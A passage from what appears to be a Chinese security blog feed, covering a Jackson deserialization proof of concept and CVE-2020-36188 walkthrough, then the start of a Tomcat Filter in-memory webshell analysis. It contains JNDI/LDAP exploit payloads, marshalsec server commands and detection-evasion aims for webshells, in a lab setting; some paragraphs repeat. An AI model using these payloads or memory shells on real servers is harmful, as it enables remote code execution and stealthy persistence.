com.fasterxml.jackson.databind.ObjectMapper;<br><span class="hljs-keyword">import</span> evil.Evil;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JSTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        p1.age = <span class="hljs-number">6</span>;<br>        p1.name = <span class="hljs-string">&quot;mi1k7ea&quot;</span>;<br>        <span class="hljs-type">Evil</span> <span class="hljs-variable">evil</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Evil</span>();<br>        evil.setCmd(<span class="hljs-string">&quot;calc&quot;</span>);<br>        p1.object=evil;<br><br><br>        <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br>        mapper.enableDefaultTyping();<br><span class="hljs-comment">//        String json=mapper.writeValueAsString(p1);</span><br><span class="hljs-comment">//        System.out.println(json);</span><br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;mi1k7ea\&quot;,\&quot;object\&quot;:&#123;\&quot;@c\&quot;:\&quot;evil.Evil\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&#125;&quot;</span>;<br><span class="hljs-comment">//        String json=&quot;&#123;\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;mi1k7ea\&quot;,\&quot;object\&quot;:[\&quot;evil.Evil\&quot;,&#123;\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;]&#125;&quot;;</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p2</span> <span class="hljs-operator">=</span> mapper.readValue(json, Person.class);<br>        System.out.println(p2);<br>    &#125;<br><br>    <br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里不管那里是@c还是@class都可以触发，只是因为使用的注解类型不一样罢了</p><p>运行即可触发：</p><h2 id="从实际CVE看FastJson"><a href="#从实际CVE看FastJson" class="headerlink" title="从实际CVE看FastJson"></a>从实际CVE看FastJson</h2><p>CVE-2020-36188</p><p>漏洞报告信息</p><blockquote><p>CVE-2020-36188FasterXML jackson-databind 2.x &lt; 2.9.10.8的版本存在该漏洞，该漏洞是由于com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource组件库存在不安全的反序列化，导致攻击者可能利用漏洞实现远程代码执行。</p></blockquote><p>从漏洞通告信息中我们可以了解到该漏洞的影响版本及Gadget的第三方库信息。</p><p>先来搭建一下测试环境：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> -m http.server<br><span class="hljs-attribute">java</span> -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar marshalsec.jndi.LDAPRefServer http://<span class="hljs-number">127.0.0.1:8000</span>/\#EvilClass<br></code></pre></td></tr></table></figure><p>环境依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jackson-databind<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.9<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.newrelic.agent.java<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>newrelic-agent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.38.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>根据官方通报所得的第三方库，搜一下</p><p>使用<code>fc:com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource</code>做为搜索关键字，这里<code>fc</code>指<code>full class</code>，即完整class路径。</p><p>查一下相关代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br>        mapper.enableDefaultTyping();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;[\&quot;com.nqadmin.rowset.JdbcRowSetImpl\&quot;,&#123;\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/Exploit\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot;&#125;]&quot;</span>;<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> mapper.readValue(payload, Object.class);<br>        mapper.writeValueAsString(o);<br></code></pre></td></tr></table></figure><p>可以看到payload的中的<code>com.nqadmin.rowset.JdbcRowSetImpl</code>就是存在不安全反序列化的组件路径，而后面的参数就是<code>JdbcRowSetImpl</code>类的属性。</p><p>根据漏洞通告中的组件信息，我们将前面的参数替换一下，接下来就需要去搜索代码查看类属性需要怎么设置了。</p><p>这里需要插入一点的是当前Jackson反序列化漏洞都是JNDI注入导致的远程代码执行，那么我们需要做的就是在存在不安全反序列化的组件中查找可以触发JNDI注入的代码。</p><p>在漏洞描述的不安全类中搜索<code>lookup</code>关键字</p><p>这里的<code>lookup</code>就是会触发JNDI注入的关键代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Context</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> initialContext.lookup(<span class="hljs-built_in">this</span>.jndiLocation);<br></code></pre></td></tr></table></figure><p>可以看到payload的中的<code>com.nqadmin.rowset.JdbcRowSetImpl</code>就是存在不安全反序列化的组件路径，而后面的参数就是<code>JdbcRowSetImpl</code>类的属性。</p><p>根据漏洞通告中的组件信息，我们将前面的参数替换一下，接下来就需要去搜索代码查看类属性需要怎么设置了。</p><p>这里需要插入一点的是当前Jackson反序列化漏洞都是JNDI注入导致的远程代码执行，那么我们需要做的就是在存在不安全反序列化的组件中查找可以触发JNDI注入的代码。</p><p>在漏洞描述的不安全类中搜索<code>lookup</code>关键字</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/t0166384543c20c5343.png" alt="lookup"></p><p>这里的<code>lookup</code>就是会触发JNDI注入的关键代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Context</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> initialContext.lookup(<span class="hljs-built_in">this</span>.jndiLocation);<br></code></pre></td></tr></table></figure><p>那么我们就需要在payload中设置相应的属性，这里就是<code>jndiLocation</code>，通过再次搜索代码可以看到<code>jndiLocation</code>有一个<code>setJndiLocation</code>方法，并且在反序列化过程是会自动调用setter方法的，那我们直接在payload中设置属性就可以了。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;jndiLocation&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://127.0.0.1:1389/Exploit&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>然后再查看<code>lookup</code>所在代码的触发条件，所在的函数是<code>lookupDataSource</code>，这个函数在<code>getConnection</code>函数中存在，当<code>dataSource == null</code>的时候会执行到，而<code>dataSource</code>在第一次进入时默认就是<code>null</code>。</p><p>这里还利用到的一点就是在序列化的时候，Jackson会先利用反射找到对象类的所有get方法，接下来去掉get前缀，然后首字母小写，作为json的每个key值，而get方法的返回值作为value。就是说<code>getter</code>方法会在序列化时被自动调用，意味着<code>getConnection</code>会在序列化时被调用到。我们的POC代码中最后使用<code>writeValueAsString</code>对对象进行了序列化操作，所以payload只要设置<code>jndiLocation</code>属性就可以了。</p><p>在<code>lookup</code>代码上打下断点debug就可以在左下角看到完整的利用链了</p><p>那么我们就需要在payload中设置相应的属性，这里就是<code>jndiLocation</code>，通过再次搜索代码可以看到<code>jndiLocation</code>有一个<code>setJndiLocation</code>方法，并且在反序列化过程是会自动调用setter方法的，那我们直接在payload中设置属性就可以了。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;jndiLocation&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://127.0.0.1:1389/Exploit&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>然后再查看<code>lookup</code>所在代码的触发条件，所在的函数是<code>lookupDataSource</code>，这个函数在<code>getConnection</code>函数中存在，顺着调用栈往下看</p><p>当<code>dataSource == null</code>的时候会执行到，</p><p>而<code>dataSource</code>在第一次进入时默认就是<code>null</code>。</p><p>这里还利用到的一点就是在序列化的时候，Jackson会先利用反射找到对象类的所有get方法，接下来去掉get前缀，然后首字母小写，作为json的每个key值，而get方法的返回值作为value。就是说<code>getter</code>方法会在序列化时被自动调用，意味着<code>getConnection</code>会在序列化时被调用到。我们的POC代码中最后使用<code>writeValueAsString</code>对对象进行了序列化操作，所以payload只要设置<code>jndiLocation</code>属性就可以了，序列化会调用get，反序列化会调用set。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Java内存马分析</title>
    <link href="/decemberus.com/2023/01/18/Servlet%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <url>/decemberus.com/2023/01/18/Servlet%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="Java内存马分析"><a href="#Java内存马分析" class="headerlink" title="Java内存马分析"></a>Java内存马分析</h1><h2 id="内存马是什么"><a href="#内存马是什么" class="headerlink" title="内存马是什么"></a>内存马是什么</h2><h3 id="什么是内存马"><a href="#什么是内存马" class="headerlink" title="什么是内存马"></a>什么是内存马</h3><p>什么是内存马呢？</p><p>内存马又名无文件马，在文件马越来越不好生存的今天，各种基于机器学习的下webshell检测让得文件马更加雪上加霜，于此同时，新的一种技术内存马愈演愈烈，但是简简单单的内存马构造技术似乎也不能够逃脱被检测查杀的风险，我们更加需要迫切的学习内存马底层的相关知识，去掉webshell特征，达到花样绕过检测机制的目的。</p><p>回归正题，来到Filter内存马的构造学习。</p><p>在Servlet来到了3.0的时代，能够动态的通过<code>ServletContext</code>进行注册是我们构造Filter的前提。</p><h3 id="什么是Filter"><a href="#什么是Filter" class="headerlink" title="什么是Filter"></a>什么是Filter</h3><p>Servlet Filter 又称 Servlet 过滤器，它是在 Servlet 2.3 规范中定义的，能够对 Servlet 容器传给 Web 资源的 request 对象和 response 对象进行检查和修改。</p><p>Filter 不是 Servlet，不能直接访问，它本身也不能生成 request 对象和 response 对象，它只能为 Web 资源提供以下过滤功能：</p><ul><li>在 Web 资源被访问前，检查 request 对象，修改请求头和请求正文，或对请求进行预处理操作。</li><li>将请求传递到下一个过滤器或目标资源。</li><li>在 Web 资源被访问后，检查 response 对象，修改响应头和响应正文。</li></ul><p>而他的工作流程可以通过一张图进行展示。</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/1662828570_631cc01aeb9c48b6cbc9c.jpeg" alt="image-20220910214207699.png"></p><p>自然而然的，如果我们能够实现写入一个自定义的Filter在在访问特定资源的同时，拦截请求，对请求进行自定义Filter中的逻辑进行调用，就能够造成我们的恶意用途，达到了内存马的目的。</p><p>也可以来看看Filter的生命周期。</p><ol><li>初始化阶段</li><li>拦截和过滤阶段</li><li>销毁阶段</li></ol><h3 id="简单的Filter示例"><a href="#简单的Filter示例" class="headerlink" title="简单的Filter示例"></a>简单的Filter示例</h3><p>需要注册&#x2F;映射Filter有两种方式：</p><blockquote><p>通过 web.xml 配置</p><p>通过 @WebFilter 注解配置</p></blockquote><p>我们这里采用了web.xml配置。</p><p>首先撰写一个实现了<code>javax.servlet.Filter</code>接口的类<code>Demo</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> pers.webshell.Tomcat;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        System.out.println(<span class="hljs-string">&quot;init.....&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        System.out.println(<span class="hljs-string">&quot;doFilter....&quot;</span>);<br>        filterChain.doFilter(servletRequest, servletResponse);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;destroy...&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>之后再在web.xml中配置。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>myFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>pers.webshell.Tomcat.Demo<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>myFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/filter<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这样就搭建了一个<code>/filter</code>路由的拦截器，在访问该路由的时候将会被拦截，运行tomcat容器。</p><h2 id="filter内存马"><a href="#filter内存马" class="headerlink" title="filter内存马"></a>filter内存马</h2><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230419201719476.png" alt="image-20230419201719476"> </p><p>关键的就是在<code>StandardWrapperValve#invoke</code>中调用了<code>filterChain.doFilter</code>。</p><p><img src="D:\mdimage\image-20230419202332237.png" alt="image-20230419202332237"> </p><p>深入看看</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230419202359115.png" alt="image-20230419202359115"> </p><p>由上图可以知道他是一个对象，一个<code>ApplicationFilterChain</code>类对象，是通过调用<code>ApplicationFilterFactory.createFilterChain</code>方法，传入了在web.xml中通过扫描得到的配置。</p><p>当然存在我们编写类的调用，回到<code>StandardWrapperValve#invoke</code>在调用了doFilter之后，在其中通过调用<code>internalDoFilter</code>方法，进行拦截器的doFilter的调用。</p><h3 id="分析注入手法"><a href="#分析注入手法" class="headerlink" title="分析注入手法"></a>分析注入手法</h3><p>通常在配置Filter都是通过web.xml配置或者注解的方式进行配置，但是我们需要注入内存马?</p><p>那怎么在代码层面上面进行配置操作，答案在就是使用<code>ServletContext</code>的<code>addFilter/createFilter</code>方法注册。</p><p>首先跟进<code>createFilter</code>方法看看。</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230419203436995.png" alt="image-20230419203436995"> </p><blockquote><p>The returned Filter instance may be further customized before it is registered with this ServletContext via a call to addFilter(String, Filter).<br>Throws:<br>ServletException – if the given clazz fails to be instantiated<br>UnsupportedOperationException – if this ServletContext was passed to the ServletContextListener.contextInitialized method of a ServletContextListener that was neither declared in web.xml or web-fragment.xml, nor annotated with javax.servlet.annotation.WebListener</p></blockquote><p>返回的Filter实例可以在通过调用addFilter(String, Filter)向ServletContext注册之前进一步定制。</p><p>我们查看tomcat的实现方法</p><p>这里有一个小坑，idea默认不查找实现方法，需要右键点一下才会去查找</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230419204558356.png" alt="image-20230419204558356"> </p><p>再去看一下addfilter</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230419205025784.png" alt="image-20230419205025784"> </p><p>用上面提到的方法去看一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> FilterRegistration.Dynamic <span class="hljs-title function_">addFilter</span><span class="hljs-params">(String filterName, String filterClass, Filter filter)</span> <span class="hljs-keyword">throws</span> IllegalStateException &#123;<br>    <span class="hljs-keyword">if</span> (filterName != <span class="hljs-literal">null</span> &amp;&amp; !filterName.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.context.getState().equals(LifecycleState.STARTING_PREP)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(sm.getString(<span class="hljs-string">&quot;applicationContext.addFilter.ise&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-built_in">this</span>.getContextPath()&#125;));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.context.findFilterDef(filterName);<br>            <span class="hljs-keyword">if</span> (filterDef == <span class="hljs-literal">null</span>) &#123;<br>                filterDef = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>                filterDef.setFilterName(filterName);<span class="hljs-comment">//往FilterDef中写入filterName</span><br>                <span class="hljs-built_in">this</span>.context.addFilterDef(filterDef);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (filterDef.getFilterName() != <span class="hljs-literal">null</span> &amp;&amp; filterDef.getFilterClass() != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (filter == <span class="hljs-literal">null</span>) &#123;<br>                filterDef.setFilterClass(filterClass);<span class="hljs-comment">//写入filterClass</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                filterDef.setFilterClass(filter.getClass().getName());<br>                filterDef.setFilter(filter);<span class="hljs-comment">//写入filter</span><br>            &#125;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterRegistration</span>(filterDef, <span class="hljs-built_in">this</span>.context);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(sm.getString(<span class="hljs-string">&quot;applicationContext.invalidFilterName&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;filterName&#125;));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>让我们愉快的解读这段代码吧！</p><ol><li>首先在第一个if语句中说明必须要存在<code>filterName</code>不然会抛出异常</li><li>其次在第二个<code>if</code>语句中判断了是否是程序刚刚启动的state，说明只能在不能再程序运行中添加filter对象</li><li>同样可以知道在没有获取到<code>filterDef</code>的情况下，将会创建一个<code>FilterDef</code>类对象，将<code>filterName / filterClass / filter</code>对象写入了其中</li><li>最后才是创建了一个<code>ApplicationFilterRegistration</code>对象并返回</li></ol><p>仅仅这样就可以了吗？</p><p>当然不可以，这里不仅限制了，在程序运行中是不能够写入filter的，而且也没有提到<code>FilterChain</code>的调用</p><p>全局搜索<code>FilterChain</code>，搜索到<code>createFilterChain</code></p><p>源码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ApplicationFilterChain <span class="hljs-title function_">createFilterChain</span><span class="hljs-params">(ServletRequest request, Wrapper wrapper, Servlet servlet)</span> &#123;<br>        <span class="hljs-keyword">if</span> (servlet == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">ApplicationFilterChain</span> <span class="hljs-variable">filterChain</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-keyword">if</span> (request <span class="hljs-keyword">instanceof</span> Request) &#123;<br>                <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request)request;<br>                <span class="hljs-keyword">if</span> (Globals.IS_SECURITY_ENABLED) &#123;<br>                    filterChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterChain</span>();<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    filterChain = (ApplicationFilterChain)req.getFilterChain();<br>                    <span class="hljs-keyword">if</span> (filterChain == <span class="hljs-literal">null</span>) &#123;<br>                        filterChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterChain</span>();<br>                        req.setFilterChain(filterChain);<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                filterChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterChain</span>();<br>            &#125;<span class="hljs-comment">//创建出来一个filterChain</span><br><br>            filterChain.setServlet(servlet);<br>            filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());<br>            <span class="hljs-comment">//判断是否支持异步处理</span><br>            <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext)wrapper.getParent();<br>            <span class="hljs-comment">//得到wrapper的父类并转化为StandContext对象</span><br>            FilterMap[] filterMaps = context.findFilterMaps();<br>            <br>            <span class="hljs-keyword">if</span> (filterMaps != <span class="hljs-literal">null</span> &amp;&amp; filterMaps.length != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-type">DispatcherType</span> <span class="hljs-variable">dispatcher</span> <span class="hljs-operator">=</span> (DispatcherType)request.getAttribute(<span class="hljs-string">&quot;org.apache.catalina.core.DISPATCHER_TYPE&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">requestPath</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">attribute</span> <span class="hljs-operator">=</span> request.getAttribute(<span class="hljs-string">&quot;org.apache.catalina.core.DISPATCHER_REQUEST_PATH&quot;</span>);<br>                <span class="hljs-keyword">if</span> (attribute != <span class="hljs-literal">null</span>) &#123;<br>                    requestPath = attribute.toString();<br>                &#125;<br><br>                <span class="hljs-type">String</span> <span class="hljs-variable">servletName</span> <span class="hljs-operator">=</span> wrapper.getName();<br>                FilterMap[] var10 = filterMaps;<br>                <span class="hljs-type">int</span> <span class="hljs-variable">var11</span> <span class="hljs-operator">=</span> filterMaps.length;<br><br>                <span class="hljs-type">int</span> var12;<br>                FilterMap filterMap;<br>                ApplicationFilterConfig filterConfig;<br>                <span class="hljs-keyword">for</span>(var12 = <span class="hljs-number">0</span>; var12 &lt; var11; ++var12) &#123;<br>                    filterMap = var10[var12];<br>                    <span class="hljs-keyword">if</span> (matchDispatcher(filterMap, dispatcher) &amp;&amp; matchFiltersURL(filterMap, requestPath)) &#123;<br>                        filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());<br>                        <span class="hljs-keyword">if</span> (filterConfig != <span class="hljs-literal">null</span>) &#123;<br>                            filterChain.addFilter(filterConfig);<br>                        &#125;<br>                    &#125;<br>                &#125;<br><br>                var10 = filterMaps;<br>                var11 = 